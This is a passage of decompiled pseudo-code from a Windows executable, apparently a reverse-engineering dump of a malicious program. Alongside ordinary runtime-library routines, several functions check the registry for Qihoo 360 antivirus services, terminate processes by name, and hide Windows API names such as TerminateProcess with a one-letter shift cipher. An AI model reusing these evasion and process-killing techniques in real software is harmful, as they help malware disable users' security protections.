          &unk_5095B0) )
    terminate(v3[0], v3[1]);
  v3[1] = (int)&unk_5095B0;
  sub_40C140(a1, lpFileName, v3);
  return a1;
}
// 41828B: using guessed type void __cdecl __noreturn terminate(_DWORD, _DWORD);

//----- (0040C140) --------------------------------------------------------
int *__cdecl sub_40C140(int *a1, LPCWSTR lpFileName, _DWORD *a3)
{
  const WCHAR *v3; // esi
  int v4; // eax
  int v5; // ecx
  int *result; // eax
  int v7; // [esp+Ch] [ebp-8h] BYREF

  v3 = lpFileName;
  if ( !std::_Execute_once(
          (struct std::once_flag *)&unk_5095AC,
          (int (__stdcall *)(void *, void *, void **))sub_405DB0,
          &unk_5095B0) )
    terminate();
  *a3 = 0;
  a3[1] = &unk_5095B0;
  if ( *((_DWORD *)lpFileName + 5) >= 8u )
    v3 = *(const WCHAR **)lpFileName;
  v4 = _Stat(v3, (int)&v7);
  v5 = v7;
  *a1 = v4;
  result = a1;
  a1[1] = v5;
  return result;
}
// 41828B: using guessed type void __noreturn terminate(void);

//----- (0040C1C0) --------------------------------------------------------
int __thiscall sub_40C1C0(const WCHAR *lpWideCharStr, int a2)
{
  int v2; // esi
  bool v3; // cf
  unsigned int v4; // kr00_4
  int v5; // ecx
  char *v6; // esi
  void **v7; // eax
  void *v8; // ecx
  int v10; // [esp+Ch] [ebp-130h]
  void *Block[4]; // [esp+10h] [ebp-12Ch] BYREF
  int v12; // [esp+20h] [ebp-11Ch]
  unsigned int v13; // [esp+24h] [ebp-118h]
  CHAR Src[260]; // [esp+28h] [ebp-114h] BYREF
  int v15; // [esp+138h] [ebp-4h]

  v2 = a2;
  v10 = a2;
  v12 = 0;
  v13 = 15;
  LOBYTE(Block[0]) = 0;
  v3 = *((_DWORD *)lpWideCharStr + 5) < 8u;
  v15 = 0;
  if ( !v3 )
    lpWideCharStr = *(const WCHAR **)lpWideCharStr;
  if ( !_To_byte(lpWideCharStr, Src) )
    sub_40E72D("invalid wchar_t filename argument");
  v4 = strlen(Src);
  v5 = v12;
  if ( v4 > v13 - v12 )
  {
    LOBYTE(v10) = 0;
    v7 = sub_4063C0(Block, v4, v10, Src, v4);
  }
  else
  {
    v12 += v4;
    v6 = (char *)Block + v5;
    memmove((char *)Block + v5, Src, v4);
    v6[v4] = 0;
    v7 = Block;
    v2 = a2;
  }
  *(_DWORD *)(v2 + 16) = 0;
  *(_DWORD *)(v2 + 20) = 0;
  *(_OWORD *)v2 = *(_OWORD *)v7;
  *(_QWORD *)(v2 + 16) = *((_QWORD *)v7 + 2);
  v7[4] = 0;
  v7[5] = (void *)15;
  *(_BYTE *)v7 = 0;
  if ( v13 >= 0x10 )
  {
    v8 = Block[0];
    if ( v13 + 1 >= 0x1000 )
    {
      v8 = (void *)*((_DWORD *)Block[0] - 1);
      if ( (unsigned int)(Block[0] - v8 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_40FBF3(v8);
  }
  return v2;
}
// 40C271: conditional instruction was optimized away because %var_118.4==F

//----- (0040C350) --------------------------------------------------------
void **__thiscall sub_40C350(_DWORD *this, void **a2, unsigned int a3, unsigned int a4)
{
  unsigned int v4; // eax
  unsigned int v5; // edx
  unsigned int v6; // edx
  unsigned int v7; // edx
  char *v8; // ecx
  char *v9; // ebx
  int v10; // esi
  int v12; // [esp+8h] [ebp-4h]

  v4 = a4;
  a2[4] = 0;
  a2[5] = (void *)7;
  *(_WORD *)a2 = 0;
  v5 = this[4];
  if ( v5 < a3 )
    sub_409080();
  v6 = v5 - a3;
  if ( v6 < a4 )
    v4 = v6;
  if ( this[5] >= 8u )
    this = (_DWORD *)*this;
  v7 = (unsigned int)a2[5];
  v8 = (char *)this + 2 * a3;
  if ( v4 > v7 )
  {
    LOBYTE(v12) = 0;
    sub_405DD0(a2, v4, v12, v8);
    return a2;
  }
  else
  {
    v9 = (char *)a2;
    if ( v7 >= 8 )
      v9 = (char *)*a2;
    v10 = 2 * v4;
    a2[4] = (void *)v4;
    memmove(v9, v8, 2 * v4);
    *(_WORD *)&v9[v10] = 0;
    return a2;
  }
}
// 40C3C9: variable 'v12' is possibly undefined
// 409080: using guessed type void __noreturn sub_409080(void);

//----- (0040C3E0) --------------------------------------------------------
int __thiscall sub_40C3E0(FILE **this)
{
  if ( !this[19] || ((int (__thiscall *)(FILE **, int))(*this)->_flag)(this, -1) == -1 || fflush(this[19]) >= 0 )
    return 0;
  else
    return -1;
}

//----- (0040C410) --------------------------------------------------------
int __cdecl UserMathErrorFunction()
{
  return 0;
}

//----- (0040C420) --------------------------------------------------------
int __thiscall sub_40C420(int this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // edx
  _DWORD *v4; // ecx
  unsigned __int8 *v5; // edx
  int result; // eax
  _DWORD *v7; // esi
  int v8; // ecx
  int v9; // edx
  FILE *v10; // eax
  int v11; // eax
  char v12; // cl
  unsigned int v13; // edx
  void **v14; // eax
  char *v15; // edx
  void **v16; // edi
  void **v17; // esi
  int v18; // eax
  void **v19; // eax
  int v20; // esi
  void **v21; // eax
  void **v22; // edx
  unsigned int v23; // edi
  unsigned int v24; // eax
  int v25; // eax
  void *v26; // ecx
  int v27; // ecx
  int v28; // esi
  int v29; // eax
  int v30; // [esp+10h] [ebp-38h]
  char *v31; // [esp+14h] [ebp-34h] BYREF
  int v32; // [esp+18h] [ebp-30h] BYREF
  void *Src[4]; // [esp+1Ch] [ebp-2Ch] BYREF
  unsigned int v34; // [esp+2Ch] [ebp-1Ch]
  unsigned int v35; // [esp+30h] [ebp-18h]
  unsigned __int8 v36; // [esp+37h] [ebp-11h] BYREF
  int v37[4]; // [esp+38h] [ebp-10h] BYREF

  v2 = **(_DWORD **)(this + 28);
  if ( v2 )
  {
    v3 = *(_DWORD **)(this + 44);
    if ( v2 < *v3 + v2 )
    {
      --*v3;
      v4 = *(_DWORD **)(this + 28);
      v5 = (unsigned __int8 *)(*v4)++;
      return *v5;
    }
  }
  if ( !*(_DWORD *)(this + 76) )
    return -1;
  v7 = *(_DWORD **)(this + 12);
  if ( *v7 == this + 60 )
  {
    v8 = *(_DWORD *)(this + 80);
    v9 = *(_DWORD *)(this + 84) - v8;
    *v7 = v8;
    **(_DWORD **)(this + 28) = v8;
    **(_DWORD **)(this + 44) = v9;
  }
  v10 = *(FILE **)(this + 76);
  if ( *(_DWORD *)(this + 56) )
  {
    v34 = 0;
    v35 = 15;
    LOBYTE(Src[0]) = 0;
    v37[3] = 0;
    v11 = fgetc(v10);
    v12 = v11;
    if ( v11 != -1 )
    {
      do
      {
        v13 = v34;
        if ( v35 == v34 )
        {
          LOBYTE(v30) = 0;
          sub_406520(Src, 1u, v30, 1u, v12);
        }
        else
        {
          ++v34;
          v14 = Src;
          if ( v35 >= 0x10 )
            v14 = (void **)Src[0];
          v15 = (char *)v14 + v13;
          *v15 = v12;
          v15[1] = 0;
        }
        v16 = Src;
        if ( v35 >= 0x10 )
          v16 = (void **)Src[0];
        v17 = Src;
        if ( v35 >= 0x10 )
          v17 = (void **)Src[0];
        v18 = (*(int (__thiscall **)(_DWORD, int, void **, unsigned int, int *, unsigned __int8 *, int *, char **))(**(_DWORD **)(this + 56) + 24))(
                *(_DWORD *)(this + 56),
                this + 64,
                v17,
                (unsigned int)v16 + v34,
                &v32,
                &v36,
                v37,
                &v31);
        if ( v18 < 0 )
          break;
        if ( v18 <= 1 )
        {
          v21 = Src;
          if ( v31 != (char *)&v36 )
          {
            if ( v35 >= 0x10 )
              v21 = (void **)Src[0];
            v27 = v32;
            v28 = (int)v21 + v34 - v32;
            if ( v28 > 0 )
            {
              while ( 1 )
              {
                v29 = *(char *)(v28 + v27 - 1);
                --v28;
                ungetc(v29, *(FILE **)(this + 76));
                if ( v28 <= 0 )
                  break;
                v27 = v32;
              }
            }
            goto LABEL_28;
          }
          v22 = Src;
          if ( v35 >= 0x10 )
            v21 = (void **)Src[0];
          v23 = v32 - (_DWORD)v21;
          v24 = v34;
          if ( v34 < v23 )
            v23 = v34;
          if ( v35 >= 0x10 )
            v22 = (void **)Src[0];
          v34 -= v23;
          memmove(v22, (char *)v22 + v23, v24 - v23 + 1);
        }
        else
        {
          if ( v18 != 3 )
            break;
          if ( v34 )
          {
            v19 = Src;
            if ( v35 >= 0x10 )
              v19 = (void **)Src[0];
            sub_40C970(&v36, 1u, v19, 1u);
LABEL_28:
            v20 = v36;
            goto LABEL_39;
          }
        }
        v25 = fgetc(*(FILE **)(this + 76));
        v12 = v25;
      }
      while ( v25 != -1 );
    }
    v20 = -1;
LABEL_39:
    if ( v35 >= 0x10 )
    {
      v26 = Src[0];
      if ( v35 + 1 >= 0x1000 )
      {
        v26 = (void *)*((_DWORD *)Src[0] - 1);
        if ( (unsigned int)(Src[0] - v26 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      sub_40FBF3(v26);
    }
    return v20;
  }
  else
  {
    result = fgetc(*(FILE **)(this + 76));
    if ( result == -1 )
      return -1;
    return (unsigned __int8)result;
  }
}
// 40C536: variable 'v30' is possibly undefined

//----- (0040C6A0) --------------------------------------------------------
int __thiscall sub_40C6A0(_DWORD **this)
{
  int result; // eax
  _DWORD *v3; // ecx
  unsigned __int8 *v4; // edx

  result = ((int (__thiscall *)(_DWORD **))(*this)[6])(this);
  if ( result != -1 )
  {
    --*this[11];
    v3 = this[7];
    v4 = (unsigned __int8 *)(*v3)++;
    return *v4;
  }
  return result;
}

//----- (0040C6D0) --------------------------------------------------------
int __thiscall sub_40C6D0(_DWORD **this)
{
  unsigned __int8 *v2; // ecx
  int result; // eax
  int v4; // edi

  v2 = (unsigned __int8 *)*this[7];
  if ( v2 && v2 < &v2[*this[11]] )
    return *v2;
  result = ((int (__thiscall *)(_DWORD **))(*this)[7])(this);
  v4 = result;
  if ( result != -1 )
  {
    ((void (__thiscall *)(_DWORD **, int))(*this)[4])(this, result);
    return v4;
  }
  return result;
}

//----- (0040C710) --------------------------------------------------------
int sub_40C710()
{
  return -1;
}

//----- (0040C720) --------------------------------------------------------
const char *__thiscall sub_40C720(_DWORD *this)
{
  int v1; // ecx
  const char *result; // eax

  v1 = this[1];
  result = "Unknown exception";
  if ( v1 )
    return (const char *)v1;
  return result;
}

//----- (0040C730) --------------------------------------------------------
size_t __thiscall sub_40C730(_DWORD **this, char *a2, __int64 a3)
{
  int v4; // ecx
  size_t v5; // edi
  int v6; // eax
  int v7; // ebx
  size_t v8; // esi
  int v9; // eax
  bool v10; // cf
  size_t v11; // eax
  unsigned int v12; // esi
  size_t v13; // kr10_4
  void *Src_4; // [esp+4h] [ebp-10h]
  unsigned int v16; // [esp+8h] [ebp-Ch]
  _DWORD **v17; // [esp+Ch] [ebp-8h]
  int v18; // [esp+10h] [ebp-4h]
  size_t v19; // [esp+24h] [ebp+10h]

  v4 = HIDWORD(a3);
  v17 = this;
  v18 = HIDWORD(a3);
  if ( a3 < 0 )
    return 0;
  v5 = a3;
  if ( a3 <= 0 )
    return 0;
  v16 = 0;
  v19 = 0;
  while ( 1 )
  {
    do
    {
      Src_4 = (void *)*this[7];
      if ( Src_4 )
        v6 = *this[11];
      else
        v6 = 0;
      v7 = v6 >> 31;
      v8 = v6;
      if ( v6 >> 31 == -1 || (v6 >> 31 == -1 || v6 >= 0) && !v6 )
      {
        v9 = ((int (__thiscall *)(_DWORD **))(*v17)[7])(v17);
        if ( v9 == -1 )
          return v19;
        v10 = v5-- != 0;
        this = v17;
        v8 = 1;
        *a2 = v9;
        v4 = v10 + v18 - 1;
        v7 = 0;
      }
      else
      {
        if ( v4 <= v7 && (v4 < v7 || v5 < v6) )
        {
          v8 = v5;
          v7 = v4;
        }
        memmove_0(a2, Src_4, v8);
        this = v17;
        v4 = (__PAIR64__(v18, v5) - __PAIR64__(v7, v8)) >> 32;
        v5 -= v8;
        *v17[11] -= v8;
        *v17[7] += v8;
      }
      v11 = v8;
      v13 = v8 + v19;
      v12 = (__PAIR64__(v7, v8) + __PAIR64__(v16, v19)) >> 32;
      v19 = v13;
      v18 = v4;
      a2 += v11;
      v16 = v12;
    }
    while ( v4 > 0 );
    if ( v4 < 0 )
      break;
    if ( !v5 )
      return v13;
  }
  return v19;
}

//----- (0040C850) --------------------------------------------------------
size_t __thiscall sub_40C850(_DWORD **this, unsigned __int8 *Src, __int64 a3)
{
  int v4; // ecx
  size_t v5; // edi
  int v6; // eax
  int v7; // ebx
  size_t v8; // esi
  bool v9; // cf
  size_t v10; // eax
  unsigned int v11; // esi
  size_t v12; // kr10_4
  void *v14; // [esp+4h] [ebp-10h]
  unsigned int v15; // [esp+8h] [ebp-Ch]
  _DWORD **v16; // [esp+Ch] [ebp-8h]
  int v17; // [esp+10h] [ebp-4h]
  size_t v18; // [esp+24h] [ebp+10h]

  v4 = HIDWORD(a3);
  v16 = this;
  v17 = HIDWORD(a3);
  if ( a3 < 0 )
    return 0;
  v5 = a3;
  if ( a3 <= 0 )
    return 0;
  v15 = 0;
  v18 = 0;
  while ( 1 )
  {
    do
    {
      v14 = (void *)*this[8];
      if ( v14 )
        v6 = *this[12];
      else
        v6 = 0;
      v7 = v6 >> 31;
      v8 = v6;
      if ( v6 >> 31 == -1 || (v6 >> 31 == -1 || v6 >= 0) && !v6 )
      {
        if ( ((int (__thiscall *)(_DWORD **, _DWORD))(*v16)[3])(v16, *Src) == -1 )
          return v18;
        v9 = v5-- != 0;
        this = v16;
        v8 = 1;
        v4 = v9 + v17 - 1;
        v7 = 0;
      }
      else
      {
        if ( v4 <= v7 && (v4 < v7 || v5 < v6) )
        {
          v8 = v5;
          v7 = v4;
        }
        memmove_0(v14, Src, v8);
        this = v16;
        v4 = (__PAIR64__(v17, v5) - __PAIR64__(v7, v8)) >> 32;
        v5 -= v8;
        *v16[12] -= v8;
        *v16[8] += v8;
      }
      v10 = v8;
      v12 = v8 + v18;
      v11 = (__PAIR64__(v7, v8) + __PAIR64__(v15, v18)) >> 32;
      v18 = v12;
      v17 = v4;
      Src += v10;
      v15 = v11;
    }
    while ( v4 > 0 );
    if ( v4 < 0 )
      break;
    if ( !v5 )
      return v12;
  }
  return v18;
}

//----- (0040C970) --------------------------------------------------------
int __cdecl sub_40C970(void *a1, size_t a2, void *Src, size_t Size)
{
  if ( !Size )
    return 0;
  if ( !a1 )
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 22;
  }
  if ( Src && a2 >= Size )
  {
    memmove_0(a1, Src, Size);
    return 0;
  }
  memset(a1, 0, a2);
  if ( !Src )
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 22;
  }
  if ( a2 >= Size )
    return 22;
  *_errno() = 34;
  _invalid_parameter_noinfo();
  return 34;
}

//----- (0040CA10) --------------------------------------------------------
char __thiscall sub_40CA10(unsigned int *this, const void *a2, int a3, int a4)
{
  size_t v5; // edi
  char result; // al
  unsigned int v7; // esi

  v5 = a3 - (_DWORD)a2;
  result = sub_40CE70(this, a3 - (_DWORD)a2);
  if ( result )
  {
    v7 = *this;
    memmove((void *)*this, a2, v5);
    result = v5 + v7;
    this[1] = v5 + v7;
  }
  return result;
}

//----- (0040CA50) --------------------------------------------------------
unsigned int *__thiscall sub_40CA50(unsigned int *this, int a2)
{
  unsigned int v3; // edi
  size_t v4; // esi

  *this = 0;
  this[1] = 0;
  this[2] = 0;
  if ( sub_40CE70(this, *(_DWORD *)(a2 + 4) - *(_DWORD *)a2) )
  {
    v3 = *this;
    v4 = *(_DWORD *)(a2 + 4) - *(_DWORD *)a2;
    memmove((void *)*this, *(const void **)a2, v4);
    this[1] = v4 + v3;
  }
  return this;
}

//----- (0040CB00) --------------------------------------------------------
int __thiscall sub_40CB00(unsigned int *this)
{
  unsigned int *v1; // edi
  unsigned int v2; // eax
  _DWORD *v3; // edx
  int v4; // esi
  int v5; // ecx
  unsigned int v6; // ecx
  unsigned int v7; // eax
  _DWORD *v8; // ebx
  int v9; // edi
  int v10; // edi
  _DWORD *v11; // ebx
  unsigned int v12; // eax
  unsigned int v13; // edx
  int v14; // edx
  unsigned int v15; // edx

  v1 = this;
  v2 = *this;
  if ( *this == 624 )
  {
    v3 = this + 2;
    v4 = 624;
    do
    {
      v5 = *(v3++ - 1);
      v6 = *(v3 - 2) ^ (*(v3 - 1) ^ v5) & 0x7FFFFFFF;
      v3[622] = (v6 >> 1) ^ v3[395] ^ ((v6 & 1) != 0 ? 0x9908B0DF : 0);
      --v4;
    }
    while ( v4 );
    v2 = *v1;
  }
  else if ( v2 >= 0x4E0 )
  {
    v7 = this[625];
    v8 = this + 625;
    v9 = 227;
    do
    {
      *(v8 - 624) = ((v7 ^ (v7 ^ v8[1]) & 0x7FFFFFFF) >> 1) ^ v8[397] ^ ((v8[1] & 1) != 0 ? 0x9908B0DF : 0);
      v7 = *++v8;
      --v9;
    }
    while ( v9 );
    v10 = 396;
    v11 = this + 852;
    v12 = this[852];
    do
    {
      *(v11 - 624) = ((v12 ^ (v11[1] ^ v12) & 0x7FFFFFFF) >> 1) ^ *(v11 - 851) ^ ((v11[1] & 1) != 0 ? 0x9908B0DF : 0);
      v12 = *++v11;
      --v10;
    }
    while ( v10 );
    v1 = this;
    this[624] = ((this[1248] ^ (this[1] ^ this[1248]) & 0x7FFFFFFF) >> 1) ^ this[397] ^ ((this[1] & 1) != 0
                                                                                       ? 0x9908B0DF
                                                                                       : 0);
    v2 = 0;
    *this = 0;
  }
  v13 = v1[v2 + 1];
  *v1 = v2 + 1;
  v14 = (v13 >> 11) & v1[1249] ^ v13;
  v15 = (((((v14 & 0xFF3A58AD) << 7) ^ v14) & 0xFFFFDF8C) << 15) ^ ((v14 & 0xFF3A58AD) << 7) ^ v14;
  return v15 ^ (v15 >> 18);
}

//----- (0040CC90) --------------------------------------------------------
BOOL sub_40CC90()
{
  FARPROC v0; // eax
  FARPROC v1; // eax
  BOOL result; // eax
  int v3; // [esp-14h] [ebp-78h]
  int v4; // [esp+0h] [ebp-64h] BYREF
  int v5; // [esp+4h] [ebp-60h] BYREF
  char v6[48]; // [esp+8h] [ebp-5Ch] BYREF
  char v7[40]; // [esp+38h] [ebp-2Ch] BYREF

  strcpy(v6, "SYSTEM\\CurrentControlSet\\Services\\zhudongfangyu");
  v4 = -2147483646;
  strcpy(v7, "SYSTEM\\CurrentControlSet\\Services\\360rp");
  v5 = -2147483646;
  v0 = sub_40D590("SfhPqfoLfzFyB");
  result = 1;
  if ( ((int (__stdcall *)(int, char *, _DWORD, int, int *))v0)(-2147483646, v6, 0, 1, &v4) )
  {
    v3 = v5;
    v1 = sub_40D590("SfhPqfoLfzFyB");
    if ( ((int (__stdcall *)(int, char *, _DWORD, int, int *))v1)(v3, v7, 0, 1, &v5) )
      return 0;
  }
  return result;
}

//----- (0040CD60) --------------------------------------------------------
BOOL sub_40CD60()
{
  HMODULE LibraryA; // eax
  FARPROC ProcAddress; // esi
  int v8[65]; // [esp+10h] [ebp-128h] BYREF
  CHAR LibFileName[16]; // [esp+114h] [ebp-24h] BYREF
  CHAR ProcName[16]; // [esp+124h] [ebp-14h] BYREF

  strcpy(LibFileName, "KERNEL32.dll");
  strcpy(ProcName, "CreateMutexA");
  LibraryA = LoadLibraryA(LibFileName);
  ProcAddress = GetProcAddress(LibraryA, ProcName);
  _EAX = 1;
  __asm { cpuid }
  sub_405860(v8, (int)"CPU%08X", _EAX);
  ((void (__stdcall *)(_DWORD, int, int *))ProcAddress)(0, 1, v8);
  return GetLastError() == 183;
}
// 40CD60: using guessed type int var_128[65];

//----- (0040CE20) --------------------------------------------------------
void *__cdecl sub_40CE20(LPCWCH lpWideCharStr)
{
  int v1; // esi
  void *v2; // edi

  v1 = WideCharToMultiByte(0, 0, lpWideCharStr, -1, 0, 0, 0, 0);
  v2 = (void *)unknown_libname_7(v1);
  memset(v2, 0, v1);
  WideCharToMultiByte(0, 0, lpWideCharStr, -1, (LPSTR)v2, v1, 0, 0);
  return v2;
}
// 41012F: using guessed type int __cdecl unknown_libname_7(_DWORD);

//----- (0040CE70) --------------------------------------------------------
char __thiscall sub_40CE70(unsigned int *this, size_t Size)
{
  size_t v4; // eax
  void *v5; // eax
  void *v6; // ecx
  unsigned int v7; // eax
  void *v8; // eax

  *this = 0;
  this[1] = 0;
  this[2] = 0;
  if ( !Size )
    return 0;
  if ( Size > 0x7FFFFFFF )
    sub_40D0A0();
  if ( Size < 0x1000 )
  {
    v8 = operator new(Size);
    *this = (unsigned int)v8;
    this[1] = (unsigned int)v8;
    this[2] = Size + *this;
    return 1;
  }
  else
  {
    v4 = Size + 35;
    if ( Size + 35 <= Size )
      v4 = -1;
    v5 = operator new(v4);
    v6 = v5;
    if ( !v5 )
      _invalid_parameter_noinfo_noreturn();
    v7 = ((unsigned int)v5 + 35) & 0xFFFFFFE0;
    *(_DWORD *)(v7 - 4) = v6;
    *this = v7;
    this[1] = v7;
    this[2] = Size + *this;
    return 1;
  }
}
// 40D0A0: using guessed type void __noreturn sub_40D0A0(void);

//----- (0040CF10) --------------------------------------------------------
unsigned int __fastcall sub_40CF10(unsigned int **a1)
{
  unsigned int *v1; // edi
  unsigned int v2; // eax
  _DWORD *v3; // eax
  int v4; // esi
  int v5; // edx
  unsigned int v6; // edx
  unsigned int v7; // eax
  _DWORD *v8; // ebx
  int v9; // edi
  int v10; // edi
  _DWORD *v11; // ebx
  unsigned int v12; // eax
  unsigned int v13; // edx
  int v14; // edx
  unsigned int v15; // edx
  unsigned int result; // eax
  unsigned int **v17; // [esp+Ch] [ebp-8h]
  unsigned int *v18; // [esp+10h] [ebp-4h]

  v17 = a1;
  do
  {
    v1 = *a1;
    v18 = *a1;
    v2 = **a1;
    if ( v2 == 624 )
    {
      v3 = v1 + 2;
      v4 = 624;
      do
      {
        v5 = *(v3++ - 1);
        v6 = *(v3 - 2) ^ (*(v3 - 1) ^ v5) & 0x7FFFFFFF;
        v3[622] = (v6 >> 1) ^ v3[395] ^ ((v6 & 1) != 0 ? 0x9908B0DF : 0);
        --v4;
      }
      while ( v4 );
      v2 = *v1;
    }
    else if ( v2 >= 0x4E0 )
    {
      v7 = v1[625];
      v8 = v1 + 625;
      v9 = 227;
      do
      {
        *(v8 - 624) = ((v7 ^ (v7 ^ v8[1]) & 0x7FFFFFFF) >> 1) ^ v8[397] ^ ((v8[1] & 1) != 0 ? 0x9908B0DF : 0);
        v7 = *++v8;
        --v9;
      }
      while ( v9 );
      v10 = 396;
      v11 = v18 + 852;
      v12 = v18[852];
      do
      {
        *(v11 - 624) = ((v12 ^ (v11[1] ^ v12) & 0x7FFFFFFF) >> 1) ^ *(v11 - 851) ^ ((v11[1] & 1) != 0 ? 0x9908B0DF : 0);
        v12 = *++v11;
        --v10;
      }
      while ( v10 );
      v1 = v18;
      v18[624] = ((v18[1248] ^ (v18[1] ^ v18[1248]) & 0x7FFFFFFF) >> 1) ^ v18[397] ^ ((v18[1] & 1) != 0 ? 0x9908B0DF : 0);
      v2 = 0;
      *v18 = 0;
    }
    v13 = v1[v2 + 1];
    *v1 = v2 + 1;
    a1 = v17;
    v14 = (v13 >> 11) & v1[1249] ^ v13;
    v15 = (((((v14 & 0xFF3A58AD) << 7) ^ v14) & 0xFFFFDF8C) << 15) ^ ((v14 & 0xFF3A58AD) << 7) ^ v14;
    result = v15 ^ (v15 >> 18);
  }
  while ( result > (unsigned int)v17[2] );
  return result;
}

//----- (0040D0A0) --------------------------------------------------------
void __noreturn sub_40D0A0()
{
  sub_40E74D("vector<T> too long");
}
// 40D0A0: using guessed type void __noreturn sub_40D0A0();

//----- (0040D0B0) --------------------------------------------------------
BOOL __cdecl sub_40D0B0(const unsigned __int16 *a1)
{
  FARPROC v1; // eax
  void *v2; // ebx
  FARPROC v3; // eax
  int v4; // eax
  FARPROC v5; // eax
  int v6; // eax
  void *v7; // esi
  FARPROC v8; // eax
  FARPROC v9; // eax
  int v11; // [esp-Ch] [ebp-244h]
  int v12; // [esp-8h] [ebp-240h]
  int v13[9]; // [esp+8h] [ebp-230h] BYREF
  unsigned __int16 v14[260]; // [esp+2Ch] [ebp-20Ch] BYREF

  v1 = sub_40D590("DsfbufUppmifmq43Tobqtipu");
  v2 = (void *)((int (__stdcall *)(int, _DWORD))v1)(15, 0);
  v13[0] = 556;
  v3 = sub_40D590("Qspdftt43GjstuX");
  if ( ((int (__stdcall *)(void *, int *))v3)(v2, v13) )
  {
    do
    {
      v4 = wcscmp(v14, a1);
      if ( v4 )
        v4 = v4 < 0 ? -1 : 1;
      if ( !v4 )
      {
        v12 = v13[2];
        v5 = sub_40D590("PqfoQspdftt");
        v6 = ((int (__stdcall *)(int, _DWORD, int))v5)(1, 0, v12);
        v7 = (void *)v6;
        if ( v6 )
        {
          v11 = v6;
          v8 = sub_40D590("UfsnjobufQspdftt");
          ((void (__stdcall *)(int, int))v8)(v11, 9);
          CloseHandle(v7);
        }
      }
      v9 = sub_40D590("Qspdftt43OfyuX");
    }
    while ( ((int (__stdcall *)(void *, int *))v9)(v2, v13) );
  }
  return CloseHandle(v2);
}
// 40D0B0: using guessed type unsigned __int16 var_20C[260];

//----- (0040D1C0) --------------------------------------------------------
_DWORD *__cdecl sub_40D1C0(_DWORD *a1, int Size)
{
  _DWORD *v2; // ebx
  unsigned int v3; // edx
  int i; // ecx
  bool v5; // cf
  _BYTE *v6; // edi
  unsigned int v7; // edx
  unsigned int v8; // esi
  unsigned int v9; // ebx
  unsigned int v10; // esi
  unsigned int v11; // edx
  unsigned int v12; // ebx
  unsigned int v13; // edi
  unsigned int v14; // eax
  unsigned int v15; // ecx
  int v16; // ebx
  unsigned int v17; // eax
  unsigned int v18; // ecx
  unsigned int v19; // edx
  _BYTE *v20; // ecx
  _BYTE *v21; // eax
  void *v22; // ecx
  void *v23; // ecx
  void *Block[5]; // [esp+10h] [ebp-1438h] BYREF
  _BYTE v26[62]; // [esp+24h] [ebp-1424h] BYREF
  char v27[2]; // [esp+62h] [ebp-13E6h] BYREF
  unsigned int *v28[3]; // [esp+64h] [ebp-13E4h] BYREF
  void *v29[3]; // [esp+70h] [ebp-13D8h] BYREF
  int *v30; // [esp+7Ch] [ebp-13CCh]
  unsigned int *v31; // [esp+80h] [ebp-13C8h]
  _DWORD *v32; // [esp+84h] [ebp-13C4h]
  _DWORD *v33; // [esp+88h] [ebp-13C0h]
  int v34; // [esp+8Ch] [ebp-13BCh]
  int v35; // [esp+90h] [ebp-13B8h]
  void *v36[2]; // [esp+94h] [ebp-13B4h] BYREF
  int v37; // [esp+9Ch] [ebp-13ACh]
  unsigned int v38; // [esp+A0h] [ebp-13A8h]
  _BYTE *v39; // [esp+A4h] [ebp-13A4h]
  int v40; // [esp+A8h] [ebp-13A0h] BYREF
  int v41[1249]; // [esp+ACh] [ebp-139Ch]
  int v42[2]; // [esp+1430h] [ebp-18h] BYREF
  int v43; // [esp+1444h] [ebp-4h]

  v2 = a1;
  v35 = 0;
  v32 = a1;
  qmemcpy(v26, "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", sizeof(v26));
  v43 = 0;
  v33 = a1;
  v34 = Size;
  v36[0] = 0;
  v36[1] = 0;
  v37 = 0;
  sub_40CA10((unsigned int *)v36, v26, (int)v27, (int)a1);
  v35 = 2;
  v43 = 1;
  v3 = std::_Random_device();
  v41[1248] = -1;
  v41[0] = v3;
  for ( i = 1; i < 624; ++i )
  {
    v3 = i + 1812433253 * (v3 ^ (v3 >> 30));
    v41[i] = v3;
  }
  v40 = 624;
  v42[1] = v36[1] - v36[0] - 1;
  v42[0] = 0;
  sub_40CA50((unsigned int *)v29, (int)v36);
  v30 = v42;
  v31 = (unsigned int *)&v40;
  a1[4] = 0;
  a1[5] = 15;
  LOBYTE(v43) = 2;
  *(_BYTE *)a1 = 0;
  sub_4092B0((void **)a1, Size, 0);
  v35 = 3;
  sub_40CA50((unsigned int *)Block, (int)v29);
  v5 = a1[5] < 0x10u;
  v39 = a1;
  if ( !v5 )
    v39 = (_BYTE *)*a1;
  v6 = Block[0];
  if ( Size )
  {
    v28[0] = v31;
    v28[1] = (unsigned int *)32;
    v28[2] = (unsigned int *)-1;
    do
    {
      v7 = v30[1];
      v8 = v7 + 0x80000000;
      v9 = *v30 + 0x80000000;
      if ( (unsigned int)*v30 >= 0x80000000 )
        v9 = *v30 + 0x80000000;
      v33 = (_DWORD *)v9;
      if ( v7 >= 0x80000000 )
        v8 = v7 + 0x80000000;
      v10 = v8 - v9;
      if ( v10 == -1 )
      {
        v11 = sub_40CF10(v28);
      }
      else
      {
        v12 = v10 + 1;
        v38 = v10 + 1;
        while ( 1 )
        {
          v13 = 0;
          v14 = 0;
          if ( v10 )
          {
            v13 = sub_40CB00(v31);
            v14 = -1;
          }
          v15 = v14 / v12;
          v16 = v14 % v12;
          if ( v13 / v38 < v15 || v16 == v10 )
            break;
          v12 = v10 + 1;
        }
        v9 = (unsigned int)v33;
        v17 = v13;
        v6 = Block[0];
        v11 = v17 % v38;
      }
      v5 = v11 + v9 < 0x80000000;
      v18 = v11 + v9 + 0x80000000;
      v19 = v18;
      if ( !v5 )
        v19 = v18;
      v20 = v39;
      *v39 = v6[v19];
      v39 = v20 + 1;
      --v34;
    }
    while ( v34 );
    v2 = v32;
  }
  if ( v6 )
  {
    v21 = v6;
    if ( (unsigned int)(Block[2] - (void *)v6) >= 0x1000 )
    {
      v6 = (_BYTE *)*((_DWORD *)v6 - 1);
      if ( (unsigned int)(v21 - v6 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_40FBF3(v6);
  }
  v22 = v29[0];
  if ( v29[0] )
  {
    if ( (unsigned int)(v29[2] - v29[0]) >= 0x1000 )
    {
      v22 = (void *)*((_DWORD *)v29[0] - 1);
